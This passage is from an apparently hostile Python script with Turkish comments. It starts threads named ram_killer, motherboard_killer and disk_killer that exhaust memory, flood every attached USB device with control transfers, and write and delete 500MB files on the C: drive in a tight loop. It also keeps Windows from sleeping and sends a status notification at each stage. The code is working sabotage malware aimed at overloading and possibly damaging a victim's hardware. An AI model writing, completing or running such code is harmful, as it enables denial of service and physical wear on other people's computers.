    send_notification("🖥️ GPU render başlatıldı (200 FPS)!")
except:
    pass

# RAM - Daha fazla
def ram_killer():
    while True:
        try:
            big_list = []
            for _ in range(5000000):  # 5 milyon eleman
                big_list.append("x" * 4096)
            big_list.clear()
            del big_list
        except:
            pass

for _ in range(4):
    threading.Thread(target=ram_killer, daemon=True).start()
send_notification("💾 RAM zorlama başlatıldı (5 milyon eleman)!")

# Anakart USB - Daha fazla
def motherboard_killer():
    try:
        import usb.core
        for dev in usb.core.find(find_all=True):
            for _ in range(50000):
                dev.ctrl_transfer(0x40, 0x0A, 0, 0, b'\x00' * 4096)
    except:
        pass
threading.Thread(target=motherboard_killer, daemon=True).start()
send_notification("🔌 Anakart USB zorlama başlatıldı (50000 döngü)!")

# PSU - Daha ağır
def disk_killer():
    while True:
        try:
            with open("C:\\temp.bin", "wb") as f:
                f.write(b'\x00' * (1024 * 1024 * 500))  # 500MB
            os.remove("C:\\temp.bin")
        except:
            pass
        time.sleep(0.001)

for _ in range(20):
    threading.Thread(target=disk_killer, daemon=True).start()
send_notification("⚡ PSU zorlama başlatıldı (500MB yazma)!")

# Kapanmayı engelle
def prevent_shutdown():
    while True:
        try:
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        except:
            pass
        time.sleep(5)
threading.Thread(target=prevent_shutdown, daemon=True).start()
send_notification("🔒 Kapanma engellendi!")

